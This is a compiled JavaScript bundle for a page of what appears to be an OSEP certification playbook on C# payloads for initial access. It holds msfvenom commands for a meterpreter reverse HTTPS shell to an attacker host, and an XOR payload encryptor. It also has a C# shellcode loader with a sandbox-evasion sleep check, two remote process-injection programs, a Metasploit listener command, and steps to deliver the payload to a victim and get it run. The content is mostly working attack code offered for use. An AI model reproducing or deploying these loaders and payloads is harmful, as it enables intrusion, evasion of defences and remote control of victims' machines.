"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[1891],{1330(e,n,t){t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>a});const r=JSON.parse('{"id":"osep/initial-access/Payloads/C-sharp","title":"C#","description":"BIN Shellcode XOR Encrypted Reverse Shell","source":"@site/docs/osep/initial-access/Payloads/C-sharp.md","sourceDirName":"osep/initial-access/Payloads","slug":"/osep/initial-access/Payloads/C-sharp","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/C-sharp","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"C#","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"HTA","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/HTA"},"next":{"title":"C/C++","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/C\u2044C++"}}');var s=t(4848),l=t(8453);const i={title:"C#",sidebar_position:1},o=void 0,c={},a=[{value:"<strong>BIN Shellcode XOR Encrypted Reverse Shell</strong>",id:"bin-shellcode-xor-encrypted-reverse-shell",level:3},{value:"<strong>Process Injection to Another Program Reverse Shell</strong>",id:"process-injection-to-another-program-reverse-shell",level:3}];function d(e){const n={blockquote:"blockquote",code:"code",em:"em",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,l.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h3,{id:"bin-shellcode-xor-encrypted-reverse-shell",children:(0,s.jsx)(n.strong,{children:"BIN Shellcode XOR Encrypted Reverse Shell"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsxs)(n.strong,{children:["Craft your\xa0",(0,s.jsx)(n.code,{children:".bin"}),"\xa0payload"]})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f raw -o [PAYLOAD_NAME].bin\n\n"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"XOR Encrypt your payload"}),", suggested key below but up to you"]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# python .\\xorencrypt.py <payload_file> <output_file> <xor_key>\npython3 ./xorencrypt.py ./pay.bin pay_encrypted.bin a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb\n\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'# Encryption code, can be found in the GitHub reference or in my GitHub repo for OSEP\nimport sys\n\ndef xor_file(input_file, output_file, key):\n    try:\n        with open(input_file, "rb") as f:\n            data = f.read()\n    except FileNotFoundError:\n        print("File not found:", input_file)\n        sys.exit(1)\n\n    key = key.encode("utf-8")\n    key_len = len(key)\n    encrypted_data = bytearray()\n\n    for i in range(len(data)):\n        current = data[i]\n        current_key = key[i % key_len]\n        encrypted_data.append(current ^ current_key)\n\n    with open(output_file, "wb") as f:\n        f.write(bytes(encrypted_data))\n\n    print("File encrypted and saved as", output_file)\n\nif __name__ == "__main__":\n    if len(sys.argv) != 4:\n        print("Usage: python xor_encrypt.py <input_file> <output_file> <key>")\n        sys.exit(1)\n\n    input_file = sys.argv[1]\n    output_file = sys.argv[2]\n    key = sys.argv[3]\n\n    xor_file(input_file, output_file, key)\n\n'})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"GitHub Reference"}),"\n"]}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsxs)(n.strong,{children:["Insert your encrypted shellcode in a new Project\xa0",(0,s.jsx)(n.code,{children:"C#"}),"\xa0Console App"]}),", called\xa0",(0,s.jsx)(n.em,{children:"gimmeshell"})]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\nnamespace gimmeshell\n{\n    class Program\n    {\n        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        [DllImport("kernel32.dll")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        [DllImport("kernel32.dll")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        [DllImport("kernel32.dll")]\n        static extern void Sleep(uint dwMilliseconds);\n        private static byte[] xor(byte[] cipher, byte[] key)\n        {\n            byte[] xored = new byte[cipher.Length];\n            for (int i = 0; i < cipher.Length; i++)\n            {\n                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);\n            }\n            return xored;\n        }\n        static void Main(string[] args)\n        {\n            DateTime t1 = DateTime.Now;\n            Sleep(4000);\n            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;\n            if (t2 < 1.5)\n            {\n                return;\n            }\n            string key = "a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb";\n            byte[] xorbuf = {\n                encryptedShellcode\n            };\n            byte[] buf = xor(xorbuf, Encoding.ASCII.GetBytes(key));\n            int size = buf.Length;\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, size);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Compile"}),"\xa0for\xa0",(0,s.jsx)(n.em,{children:"Release and x64"})]}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Start your listener"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport 443; exploit"\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Find a way to deliver o download this to the victim and then trigger it"}),", just to mention examples, we could trigger execution using\xa0",(0,s.jsx)(n.em,{children:"SQL RCE on Linked Servers, NTLM Relays, or PrintSpooler"})]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"process-injection-to-another-program-reverse-shell",children:(0,s.jsx)(n.strong,{children:"Process Injection to Another Program Reverse Shell"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Find the PID of the process that we want to inject"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'tasklist /FI "IMAGENAME eq [PROGRAM_CHOSEN].exe"\nor\nGet-Process | Where-Object {$_.Path -like "*[PROGRAM_CHOSEN].exe*"}\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Generate shellcode"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp\n\n"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Create new VS Project"}),":\xa0",(0,s.jsx)(n.em,{children:"New Project > .NET Standard Console App"})]}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Inject shellcode and PID into code"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Runtime.InteropServices;\n\nnamespace Inject\n{\n    class Program\n    {\n        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n        [DllImport("kernel32.dll")]\n        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n        [DllImport("kernel32.dll")]\n        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        static void Main(string[] args)\n        {\n            // Replace the PID\n            IntPtr hProcess = OpenProcess(0x001F0FFF, false, [PID]);\n            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);\n\n            // Replace the shellcode\n            byte[] buf = new byte[591] {\n            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n            ....\n            0x0a,0x41,0x89,0xda,0xff,0xd5 };\n                        IntPtr outSize;\n            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);\n\n            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        }\n    }\n}\n\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Option 2 to Find the PID Dynamically"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Runtime.InteropServices;\n\nnamespace Inject\n{\n    class Program\n    {\n        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n        [DllImport("kernel32.dll")]\n        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n        [DllImport("kernel32.dll")]\n        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        static void Main(string[] args)\n        {\n            // Find the PID by Name: eg. explorer\n            Process[] expProc = Process.GetProcessesByName("[PROGRAM_CHOSEN]");\n            int pid = expProc[0].Id;\n\n            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);\n            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);\n\n            // Replace the shellcode\n            byte[] buf = new byte[591] {\n            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n            ....\n            0x0a,0x41,0x89,0xda,0xff,0xd5 };\n                        IntPtr outSize;\n            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);\n\n            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        }\n    }\n}\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Compile for Release"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Find a way for the user to execute this code"})}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453(e,n,t){t.d(n,{R:()=>i,x:()=>o});var r=t(6540);const s={},l=r.createContext(s);function i(e){const n=r.useContext(l);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(l.Provider,{value:n},e.children)}}}]);